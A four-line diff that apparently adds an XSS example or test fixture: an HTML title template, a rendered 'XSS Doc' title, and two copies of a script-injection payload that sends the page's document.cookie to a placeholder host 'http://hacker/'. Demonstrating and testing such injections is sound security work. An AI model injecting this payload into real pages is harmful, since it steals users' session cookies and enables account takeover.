@@ -1,0 +1,4 @@
+<title>Example document: %(title)</title>
+title>Example document: XSS Doc</title>
+"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
+"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
